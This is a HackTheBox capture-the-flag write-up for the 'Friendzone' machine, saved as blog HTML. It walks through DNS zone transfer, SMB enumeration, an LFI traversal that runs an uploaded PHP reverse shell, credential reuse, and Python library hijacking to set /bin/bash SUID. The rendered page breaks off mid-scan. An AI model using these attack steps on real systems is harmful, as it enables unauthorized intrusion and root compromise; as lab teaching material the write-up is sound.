<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Friendzone | PwndSide</title><meta name=keywords content="privesc,web,linux"><meta name=description content="Linux machine with a website which has LFI and thanks to be able to upload resources to the machine via smb we pwnd the user. A Library Hijacking vulnerability help us to privEsc as root."><meta name=author content="Ayman Boulaich"><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css integrity="sha256-j+ECM6cGvIfy4Is8+XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/friendzone-htb/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="http://localhost:1313/posts/friendzone-htb/"><meta property="og:site_name" content="PwndSide"><meta property="og:title" content="Friendzone"><meta property="og:description" content="Linux machine with a website which has LFI and thanks to be able to upload resources to the machine via smb we pwnd the user. A Library Hijacking vulnerability help us to privEsc as root."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-09-11T19:13:39+02:00"><meta property="article:modified_time" content="2023-09-11T19:13:39+02:00"><meta property="article:tag" content="Privesc"><meta property="article:tag" content="Web"><meta property="article:tag" content="Linux"><meta property="og:image" content="http://localhost:1313/%3Cimage%20path/url%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/%3Cimage%20path/url%3E"><meta name=twitter:title content="Friendzone"><meta name=twitter:description content="Linux machine with a website which has LFI and thanks to be able to upload resources to the machine via smb we pwnd the user. A Library Hijacking vulnerability help us to privEsc as root."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"Friendzone","item":"http://localhost:1313/posts/friendzone-htb/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Friendzone","name":"Friendzone","description":"Linux machine with a website which has LFI and thanks to be able to upload resources to the machine via smb we pwnd the user. A Library Hijacking vulnerability help us to privEsc as root.","keywords":["privesc","web","linux"],"articleBody":"Room Information Room name: Friendzone Difficulty level: Easy Room link: https://app.hackthebox.com/machines/Friendzone Tools Used nmap Port Scanning sudo nmap $IP -n -Pn -vvv --min-rate 5000 PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 63 vsftpd 3.0.3 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4/mXYmkhp2syUwYpiTjyUAVgrXhoAJ3eEP/Ch7omJh1jPHn3RQOxqvy9w4M6mTbBezspBS+hu29tO2vZBubheKRKa/POdV5Nk+A+q3BzhYWPQA+A+XTpWs3biNgI/4pPAbNDvvts+1ti+sAv47wYdp7mQysDzzqtpWxjGMW7I1SiaZncoV9L+62i+SmYugwHM0RjPt0HHor32+ZDL0hed9p2ebczZYC54RzpnD0E/qO3EE2ZI4pc7jqf/bZypnJcAFpmHNYBUYzyd7l6fsEEmvJ5EZFatcr0xzFDHRjvGz/44pekQ40ximmRqMfHy1bs2j+e39NmsNSp6kAZmNIsx | 256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOPI7HKY4YZ5NIzPESPIcP0tdhwt4NRep9aUbBKGmOheJuahFQmIcbGGrc+DZ5hTyGDrvlFzAZJ8coDDUKlHBjo= | 256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF+FZS11nYcVyJgJiLrTYTIy3ia5QvE3+5898MfMtGQl 53/tcp open domain syn-ack ttl 63 ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) | http-methods: |_ Supported Methods: HEAD GET POST OPTIONS |_http-title: Friend Zone Escape software 139/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http syn-ack ttl 63 Apache httpd 2.4.29 |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 404 Not Found | http-methods: |_ Supported Methods: HEAD GET POST OPTIONS | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/organizationalUnitName=CODERED/localityName=AMMAN/emailAddress=haha@friendzone.red | Issuer: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/organizationalUnitName=CODERED/localityName=AMMAN/emailAddress=haha@friendzone.red | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2018-10-05T21:02:30 | Not valid after: 2018-11-04T21:02:30 | MD5: c144:1868:5e8b:468d:fc7d:888b:1123:781c | SHA-1: 88d2:e8ee:1c2c:dbd3:ea55:2e5e:cdd4:e94c:4c8b:9233 | -----BEGIN CERTIFICATE----- | MIID+DCCAuCgAwIBAgIJAPRJYD8hBBg0MA0GCSqGSIb3DQEBCwUAMIGQMQswCQYD | VQQGEwJKTzEQMA4GA1UECAwHQ09ERVJFRDEOMAwGA1UEBwwFQU1NQU4xEDAOBgNV | BAoMB0NPREVSRUQxEDAOBgNVBAsMB0NPREVSRUQxFzAVBgNVBAMMDmZyaWVuZHpv | bmUucmVkMSIwIAYJKoZIhvcNAQkBFhNoYWhhQGZyaWVuZHpvbmUucmVkMB4XDTE4 | MTAwNTIxMDIzMFoXDTE4MTEwNDIxMDIzMFowgZAxCzAJBgNVBAYTAkpPMRAwDgYD | VQQIDAdDT0RFUkVEMQ4wDAYDVQQHDAVBTU1BTjEQMA4GA1UECgwHQ09ERVJFRDEQ | MA4GA1UECwwHQ09ERVJFRDEXMBUGA1UEAwwOZnJpZW5kem9uZS5yZWQxIjAgBgkq | hkiG9w0BCQEWE2hhaGFAZnJpZW5kem9uZS5yZWQwggEiMA0GCSqGSIb3DQEBAQUA | A4IBDwAwggEKAoIBAQCjImsItIRhGNyMyYuyz4LWbiGSDRnzaXnHVAmZn1UeG1B8 | lStNJrR8/ZcASz+jLZ9qHG57k6U9tC53VulFS+8Msb0l38GCdDrUMmM3evwsmwrH | 9jaB9G0SMGYiwyG1a5Y0EqhM8uEmR3dXtCPHnhnsXVfo3DbhhZ2SoYnyq/jOfBuH | gBo6kdfXLlf8cjMpOje3dZ8grwWpUDXVUVyucuatyJam5x/w9PstbRelNJm1gVQh | 7xqd2at/kW4g5IPZSUAufu4BShCJIupdgIq9Fddf26k81RQ11dgZihSfQa0HTm7Q | ui3/jJDpFUumtCgrzlyaM5ilyZEj3db6WKHHlkCxAgMBAAGjUzBRMB0GA1UdDgQW | BBSZnWAZH4SGp+K9nyjzV00UTI4zdjAfBgNVHSMEGDAWgBSZnWAZH4SGp+K9nyjz | V00UTI4zdjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBV6vjj | TZlc/bC+cZnlyAQaC7MytVpWPruQ+qlvJ0MMsYx/XXXzcmLj47Iv7EfQStf2TmoZ | LxRng6lT3yQ6Mco7LnnQqZDyj4LM0SoWe07kesW1GeP9FPQ8EVqHMdsiuTLZryME | K+/4nUpD5onCleQyjkA+dbBIs+Qj/KDCLRFdkQTX3Nv0PC9j+NYcBfhRMJ6VjPoF | Kwuz/vON5PLdU7AvVC8/F9zCvZHbazskpy/quSJIWTpjzg7BVMAWMmAJ3KEdxCoG | X7p52yPCqfYopYnucJpTq603Qdbgd3bq30gYPwF6nbHuh0mq8DUxD9nPEcL8q6XZ | fv9s+GxKNvsBqDBX |_-----END CERTIFICATE----- 445/tcp open syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: , NetBIOS MAC: (unknown) | Names: | FRIENDZONE\u003c00\u003e Flags: | FRIENDZONE\u003c03\u003e Flags: | FRIENDZONE\u003c20\u003e Flags: | \\x01\\x02__MSBROWSE__\\x02\u003c01\u003e Flags: | WORKGROUP\u003c00\u003e Flags: | WORKGROUP\u003c1d\u003e Flags: | WORKGROUP\u003c1e\u003e Flags: | Statistics: | 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00 | 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00 |_ 00:00:00:00:00:00:00:00:00:00:00:00:00:00 |_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: -1s | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb2-time: | date: 2023-09-06T15:35:12 |_ start_date: N/A | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 60332/tcp): CLEAN (Couldn't connect) | Check 2 (port 29635/tcp): CLEAN (Couldn't connect) | Check 3 (port 37865/udp): CLEAN (Failed to receive data) | Check 4 (port 49559/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: friendzone | NetBIOS computer name: FRIENDZONE\\x00 | Domain name: \\x00 | FQDN: friendzone |_ System time: 2023-09-06T18:35:12+03:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) The scan shows 7 ports up and running, 80 and 443 are running web servers, 139 and 445 are smb ports, 22 for ssh, 21 for ftp and 25 is running a ISC service which is a kind of DNS.\nI’ll take careful notice of the domain in the TLS certificate, commonName=friendzone.red\nEnumeration As always I am gonna start with the websites.\nFirst let’s start with the http server.\nTe homepage leaks a email with a URL friendzoneportal.red maybe there is virtualhosting in the website.\ngobuster dir -u http://friendzone.red/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,txt -t 100 -o fuzz | tee fuzz.save /index.html (Status: 200) [Size: 324] /robots.txt (Status: 200) [Size: 13] /server-status (Status: 403) [Size: 300] /wordpress (Status: 301) [Size: 316] [--\u003e http://10.10.10.123/wordpress/] After a quick fuzz two directories are shown\n/robots.txt is troll.\n/wordpress is empty.\nSo let’s move to the ssl site.\nIn the homepage we found normal gif but if we access to the source code there is a comment leaking a directory /js/js on development.\nThe directory /js/js is a page which maybe something is being tested.\nThere are also some hidden comments at the source code.\n\u003cp\u003eTesting some functions !\u003c/p\u003e\u003cp\u003eI'am trying not to break things !\u003c/p\u003e SkUyRVFwSlF2VzE2OTQzMzc4MjIybkJLbUE5RVdN I don’t know what are they referring to, but you have to keep in mind that it could just be a rabbit hole.\nLet’s do a quick fuzz\ngobuster dir -u https://friendzone.red/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,txt -t 100 -o fuzz | tee fuzz.save /admin (Status: 301) [Size: 318] [--\u003e https://friendzone.red/admin/] /index.html (Status: 200) [Size: 238] /js (Status: 301) [Size: 315] [--\u003e https://friendzone.red/js/] /server-status (Status: 403) [Size: 303] Again, only two directories are displayed\n/admin is a empty directory as /wordpress in the http site.\n/js lists only one directory named /js which is the one we have already visited.\nIf we return to the nmap scan there, the TCP port 53 is for DNS which means that maybe this is associated with Zone Transfers, where the server give all the information it has for a domain. Before doing any virtual hosting scans I checked Zone Transfers for enumerating DNS.\nAs we have two domains let’s see what outputs dig command.\ndig @10.10.10.123 friendzone.red axfr ; \u003c\u003c\u003e\u003e DiG 9.10.6 \u003c\u003c\u003e\u003e @10.10.10.123 friendzone.red axfr ; (1 server found) ;; global options: +cmd friendzone.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800 friendzone.red.\t604800\tIN\tAAAA\t::1 friendzone.red.\t604800\tIN\tNS\tlocalhost. friendzone.red.\t604800\tIN\tA\t127.0.0.1 administrator1.friendzone.red. 604800 IN A\t127.0.0.1 hr.friendzone.red.\t604800\tIN\tA\t127.0.0.1 uploads.friendzone.red.\t604800\tIN\tA\t127.0.0.1 friendzone.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800 ;; Query time: 110 msec ;; SERVER: 10.10.10.123#53(10.10.10.123) ;; WHEN: Sun Sep 10 12:07:34 CEST 2023 ;; XFR size: 8 records (messages 1, bytes 261) dig @10.10.10.123 friendzoneportal.red axfr ; \u003c\u003c\u003e\u003e DiG 9.10.6 \u003c\u003c\u003e\u003e @10.10.10.123 friendzoneportal.red axfr ; (1 server found) ;; global options: +cmd friendzoneportal.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800 friendzoneportal.red.\t604800\tIN\tAAAA\t::1 friendzoneportal.red.\t604800\tIN\tNS\tlocalhost. friendzoneportal.red.\t604800\tIN\tA\t127.0.0.1 admin.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 files.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 imports.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 vpn.friendzoneportal.red. 604800 IN\tA\t127.0.0.1 friendzoneportal.red.\t604800\tIN\tSOA\tlocalhost. root.localhost. 2 604800 86400 2419200 604800 ;; Query time: 104 msec ;; SERVER: 10.10.10.123#53(10.10.10.123) ;; WHEN: Sun Sep 10 12:08:07 CEST 2023 ;; XFR size: 9 records (messages 1, bytes 281) Cool we have a bunch of possible subdomains, let’s put them on /etc/hosts\nFirst I tried to access to each subdomain with the http port but seem to go back to the same site so I started to do it with ssl site instead.\nDomain Comments administrator1.friendzone.red Seems a admin page uploads.friendzone.red Fake uploads site hr.friendzone.red Not Found friendzoneportal.red Only a GIF of Michael Jackson admin.friendzoneportal.red When I try to put any creds shows “Admin page is not developed yet !!! check for another one” files.friendzoneportal.red Not Found imports.friendzoneportal.red Not Found vpn.friendzoneportal.red Not Found administrator1.friendzone.red is the only one which seems working but need a valid credentials. I tried some common credentials but failed.\nLet’s move now to other ports.\nI started with the ftp service. I tried to log in anonymously but the login failed\nSo I decided to try to access to smb instead, using smbmap I can access anonymously and see what permissions I have on the shares.\nInteresting the Files shares comment show his directory so we can assume that all the directories are located at /etc without doing any enumeration.\nThanks to smbmap we also know that general is only readable and Development is readable and writeable.\nDevelopment seems empty.\ngeneral has only one file with credentials.\ncreds for the admin THING: admin:WORKWORKHhallelujah@# Maybe there are credentials for the admin site.\nExploiting Once logged in in the admin page, the site tells yo to visit to the dashboard.\nIn order to show the image we need to put the two default parameters.\nimage_id=a.jpg\u0026pagename=timestamp\nInteresting pagename points to timestamp and if the input is not being sanitized maybe we can change the input to other file.\nI tried to point to the dashboard.php page but the site is not loading.\nAfter that I realized that the code is putting .php at the end of the input.\nimage_id=a.jpg\u0026pagename=dashboard\nThe site is loading infinite times so we can assume that we have LFI with php files.\nNow we have LFI and if we remember the samba shares are pointing to folders on the /etc directory so we are able to upload a shell and make it run with the pagename parameter.\nThe only share which is writable is the Development folder so I tried to upload a php reverse shell. As always I am gonna using the pentestmonkey one\nsmbmap -H 10.10.10.123 --upload './shell.php' 'Development\\shell.php' Now let’s set a nc listener and run the php reverse shell with the next parameters image_id=a.jpg\u0026pagename=../../../../../../etc/Development/shell\nnc -lv 4444 Gaining an Initial Foothold Great we are www-data now.\nEscalating Privilege If we check the /var/www directory where are located all the sites we can see a suspicious mysql file.\nfor development process this is the mysql creds for user friend db_user=friend db_pass=Agpyu12!0.213$ db_name=FZ Seems credentials for access to a mysql database, but let’s see if there is a password reuse.\nI tried to access to the user friend with the command su friend\nAwesome we are logged as normal user.\nNow it’s time to privEsc.\nAs always I checked for unusual processes or open ports but I don’t found anything and then I have searched for SUID files to exploit but there was nothing exploitable.\nOnce done the initial check I start the scan of scheduled processes with moniProc.sh which I have used in a lot of writeups.\n\u003e /usr/sbin/CRON -f \u003e /bin/sh -c /opt/server_admin/reporter.py \u003e /usr/bin/python /opt/server_admin/reporter.py A cronjob is executing a python script, let’s check his content.\n#!/usr/bin/python import os to_address = \"admin1@friendzone.com\" from_address = \"admin2@friendzone.com\" print \"[+] Trying to send email to %s\"%to_address #command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass \"PAPAP\"''' #os.system(command) # I need to edit the script later # Sam ~ python developer The scripts doesn’t seems exploitable but is using the os library, if this library is vulnerable to Library Hijacking we are able to execute whatever we want.\nThe attack explanation is simple, the searched python module will be located in one of the defined paths, but if Python finds a module with the same name in a folder with higher priority, it will import that module instead of the “legit” one.\nWe can know the Python Path with the following command.\npython -c 'import sys; print(sys.path)' ['', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages'] The first path that python will check will be the script directory, if nothing is located at the script directory python will check all the remaining paths.\nAs we can’t write anything on the script folder, we need to check if any folder containing os.py module is writable in order to perform the attack.\nAs we know the first folder python will check is the /usr/lib/python2.7, let’s check if we can modify the module.\nWe have permissions to edit the file so we can put the following line of code which is going to be executed always when we import the library.\nsystem('chmod 4755 /bin/bash') As the cronjob is executed as root, we are able to execute commands as the above which helps us to privEsc changing the bash permissions to that of a SUID file.\nNow only rests to wait.\nIf we execute the following command the current bash session is gonna turn to a root session.\nbash -p ","wordCount":"1917","inLanguage":"en","image":"http://localhost:1313/%3Cimage%20path/url%3E","datePublished":"2023-09-11T19:13:39+02:00","dateModified":"2023-09-11T19:13:39+02:00","author":{"@type":"Person","name":"Ayman Boulaich"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/friendzone-htb/"},"publisher":{"@type":"Organization","name":"PwndSide","logo":{"@type":"ImageObject","url":"http://localhost:1313/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="PwndSide (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>PwndSide</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/hackthebox title=HackTheBox><span>HackTheBox</span></a></li><li><a href=http://localhost:1313/categories/ctf title="CTF's"><span>CTF's</span></a></li><li><a href=http://localhost:1313/about/whoami/ title=whoami><span>whoami</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Friendzone</h1><div class=post-description>Linux machine with a website which has LFI and thanks to be able to upload resources to the machine via smb we pwnd the user. A Library Hijacking vulnerability help us to privEsc as root.</div><div class=post-meta><span title='2023-09-11 19:13:39 +0200 CEST'>September 11, 2023</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;1917 words&nbsp;·&nbsp;Ayman Boulaich&nbsp;|&nbsp;<a href=https://github.com/pwndside/pwndside.github.io/content/posts/friendzone-htb.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#room-information>Room Information</a></li><li><a href=#tools-used>Tools Used</a></li><li><a href=#port-scanning>Port Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploiting>Exploiting</a></li><li><a href=#gaining-an-initial-foothold>Gaining an Initial Foothold</a></li><li><a href=#escalating-privilege>Escalating Privilege</a></li></ul></nav></div></details></div><div class=post-content><h2 id=room-information>Room Information<a hidden class=anchor aria-hidden=true href=#room-information>#</a></h2><ul><li>Room name: Friendzone</li><li>Difficulty level: Easy</li><li>Room link: <a href=https://app.hackthebox.com/machines/Friendzone>https://app.hackthebox.com/machines/Friendzone</a></li></ul><p><img alt=Untitled loading=lazy src=/HTB/friend-icon.png></p><h2 id=tools-used>Tools Used<a hidden class=anchor aria-hidden=true href=#tools-used>#</a></h2><ul><li>nmap</li></ul><h2 id=port-scanning>Port Scanning<a hidden class=anchor aria-hidden=true href=#port-scanning>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap <span class=nv>$IP</span> -n -Pn -vvv --min-rate <span class=m>5000</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PORT    STATE SERVICE     REASON         VERSION
</span></span><span class=line><span class=cl>21/tcp  open  ftp         syn-ack ttl <span class=m>63</span> vsftpd 3.0.3
</span></span><span class=line><span class=cl>22/tcp  open  ssh         syn-ack ttl <span class=m>63</span> OpenSSH 7.6p1 Ubuntu <span class=m>4</span> <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey:
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4/mXYmkhp2syUwYpiTjyUAVgrXhoAJ3eEP/Ch7omJh1jPHn3RQOxqvy9w4M6mTbBezspBS+hu29tO2vZBubheKRKa/POdV5Nk+A+q3BzhYWPQA+A+XTpWs3biNgI/4pPAbNDvvts+1ti+sAv47wYdp7mQysDzzqtpWxjGMW7I1SiaZncoV9L+62i+SmYugwHM0RjPt0HHor32+ZDL0hed9p2ebczZYC54RzpnD0E/qO3EE2ZI4pc7jqf/bZypnJcAFpmHNYBUYzyd7l6fsEEmvJ5EZFatcr0xzFDHRjvGz/44pekQ40ximmRqMfHy1bs2j+e39NmsNSp6kAZmNIsx
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOPI7HKY4YZ5NIzPESPIcP0tdhwt4NRep9aUbBKGmOheJuahFQmIcbGGrc+DZ5hTyGDrvlFzAZJ8coDDUKlHBjo<span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF+FZS11nYcVyJgJiLrTYTIy3ia5QvE3+5898MfMtGQl
</span></span><span class=line><span class=cl>53/tcp  open  domain      syn-ack ttl <span class=m>63</span> ISC BIND 9.11.3-1ubuntu1.2 <span class=o>(</span>Ubuntu Linux<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> dns-nsid:
</span></span><span class=line><span class=cl><span class=p>|</span>_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
</span></span><span class=line><span class=cl>80/tcp  open  http        syn-ack ttl <span class=m>63</span> Apache httpd 2.4.29 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods:
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: HEAD GET POST OPTIONS
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Friend Zone Escape software
</span></span><span class=line><span class=cl>139/tcp open  netbios-ssn syn-ack ttl <span class=m>63</span> Samba smbd 3.X - 4.X <span class=o>(</span>workgroup: WORKGROUP<span class=o>)</span>
</span></span><span class=line><span class=cl>443/tcp open  ssl/http    syn-ack ttl <span class=m>63</span> Apache httpd 2.4.29
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: <span class=m>404</span> Not Found
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods:
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: HEAD GET POST OPTIONS
</span></span><span class=line><span class=cl><span class=p>|</span> tls-alpn:
</span></span><span class=line><span class=cl><span class=p>|</span>_  http/1.1
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: TLS randomness does not represent <span class=nb>time</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>friendzone.red/organizationName<span class=o>=</span>CODERED/stateOrProvinceName<span class=o>=</span>CODERED/countryName<span class=o>=</span>JO/organizationalUnitName<span class=o>=</span>CODERED/localityName<span class=o>=</span>AMMAN/emailAddress<span class=o>=</span>haha@friendzone.red
</span></span><span class=line><span class=cl><span class=p>|</span> Issuer: <span class=nv>commonName</span><span class=o>=</span>friendzone.red/organizationName<span class=o>=</span>CODERED/stateOrProvinceName<span class=o>=</span>CODERED/countryName<span class=o>=</span>JO/organizationalUnitName<span class=o>=</span>CODERED/localityName<span class=o>=</span>AMMAN/emailAddress<span class=o>=</span>haha@friendzone.red
</span></span><span class=line><span class=cl><span class=p>|</span> Public Key type: rsa
</span></span><span class=line><span class=cl><span class=p>|</span> Public Key bits: <span class=m>2048</span>
</span></span><span class=line><span class=cl><span class=p>|</span> Signature Algorithm: sha256WithRSAEncryption
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2018-10-05T21:02:30
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid after:  2018-11-04T21:02:30
</span></span><span class=line><span class=cl><span class=p>|</span> MD5:   c144:1868:5e8b:468d:fc7d:888b:1123:781c
</span></span><span class=line><span class=cl><span class=p>|</span> SHA-1: 88d2:e8ee:1c2c:dbd3:ea55:2e5e:cdd4:e94c:4c8b:9233
</span></span><span class=line><span class=cl><span class=p>|</span> -----BEGIN CERTIFICATE-----
</span></span><span class=line><span class=cl><span class=p>|</span> MIID+DCCAuCgAwIBAgIJAPRJYD8hBBg0MA0GCSqGSIb3DQEBCwUAMIGQMQswCQYD
